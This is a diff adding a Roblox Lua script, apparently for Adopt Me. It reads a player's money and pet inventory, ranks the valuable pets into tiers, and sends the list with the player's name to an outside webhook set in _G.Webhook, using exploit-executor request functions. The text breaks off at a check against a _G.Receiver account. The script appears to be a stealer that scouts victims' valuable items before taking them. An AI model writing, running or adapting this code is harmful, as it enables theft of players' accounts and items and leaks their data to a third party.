@@ -1,0 +1,126 @@
+    local result = {
+        money = 0,
+        pets = {},
+        toys = {},
+        high = {},
+        mid = {},
+        mega = {},
+        neon = {},
+        sexy = {}
+    }
+    local load = require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load
+    
+    
+
+    local data = load("ClientData")
+    local pets = data.get("inventory").pets
+    local db = require(game:GetService("ReplicatedStorage"):WaitForChild('ClientDB'):WaitForChild('Inventory'):WaitForChild('InventoryDB'))
+
+    
+    result.money = data.get('money')
+    
+    for i,v in pairs(pets) do
+        local info = db.pets[v.id]
+        local name = info.name
+        local rarity = info.rarity
+        local flyable = v.properties.flyable and "F" or ""
+        local rideable = v.properties.rideable and "R" or ""
+        local mega = (v.properties.mega or v.properties.mega_neon) and "M" or ""
+        local age = v.properties.age
+        local neon = v.properties.neon and "N" or ""
+        local pepek
+        if rarity == "legendary" then
+            pepek = "A"
+        elseif rarity == "ultra_rare" then
+            pepek = "B"
+        elseif rarity == "rare" then
+            pepek = "C"
+        elseif rarity == "uncommon" then
+            pepek = "D"
+        elseif rarity == "common" then
+            pepek = "E"
+        end
+        
+        code = ("%s%s%s"):format(
+            mega .. neon,
+            flyable,
+            rideable
+        )
+
+
+        row = ("[%s] %s (%s)"):format(
+            pepek,
+            name,
+            code
+        )
+        
+        row_high = ("%s %s"):format(
+            code,
+            name
+        )
+        table.insert(result.pets, row)
+        if name == "Shadow Dragon" or name == "Bat Dragon" or name == "Giraffe" then
+            table.insert(result.high, row_high)
+        end
+        if name == "Frost Dragon" or name == "Parrot" or name == "Owl" or name == "Crow" or name == "Evil Unicorn" or name == "Jungle Egg" or name == "Farm Egg" or name == "Safari Egg" or name == "Christmas Egg" then
+            table.insert(result.mid, row_high)
+        end
+        if v.properties.mega or v.properties.mega_neon then
+            table.insert(result.mega, row_high)
+        end
+        if v.properties.neon then
+            table.insert(result.neon, row_high)
+        end
+        if name == "Turtle" or name == "Kangaroo" or name == "Arctic Reindeer" or name == "Albino Monkey" or name == "Cow" or name == "Elephant" or name == "Flamingo" or name == "Crocodile" or name == "Meerkat" or name == "Blue Dog" or name == "Pink Cat" or name == "Pig" or name == "Monkey King" or name == "Hedgehog" or name == "Dalmation" or rarity == "legendary" and (v.properties.mega or v.properties.mega_neon) or rarity == "legendary" and v.properties.neon then
+            table.insert(result.sexy, row_high)
+        end
+    end
+local function sendWebhook(url, contents)
+        local data = {
+            ["embeds"] = {{
+                ["title"] = tostring(game:GetService("Players").LocalPlayer),
+                ["description"] = contents,
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da)
+            }}
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        local wh = {
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        }
+        request = http_request or request or HttpPost or syn.request
+        local HttpService = game:GetService("HttpService")
+        request(wh)
+end
+table.sort(result.pets, function(a,b)
+	return a:lower() < b:lower()
+end)
+local res_high = table.concat(result.high, ', ');
+local res_mid = table.concat(result.mid, ', ');
+local res_mega = table.concat(result.mega, ', ');
+local res_neon = table.concat(result.neon, ', ');
+local res_sexy = table.concat(result.sexy, ', ');
+if res_high ~= "" then
+    res_high = ":star2: **High Tier** \r\n ```" .. res_high .. "```"
+end
+if res_mid ~= "" then
+    res_mid = ":star: **Mid Tier** \r\n ```" .. res_mid .. "```"
+end
+if res_mega ~= "" then
+    res_mega = ":fire: **Mega Neon** \r\n ```" .. res_mega .. "```"
+end
+if res_neon ~= "" then
+    res_neon = ":heart: **Neon** \r\n ```" .. res_neon .. "```"
+end
+if res_sexy ~= "" then
+    res_sexy = ":hot_face: **Sexy** \r\n ```" .. res_sexy .. "```"
+end
+sendWebhook(_G.Webhook, res_high .. res_mid .. res_mega .. res_neon .. res_sexy)
+if res_high == "" and res_mid == "" and res_mega == "" and res_neon == "" and res_sexy == "" and tostring(game:GetService("Players").LocalPlayer) ~= _G.Receiver then
+	
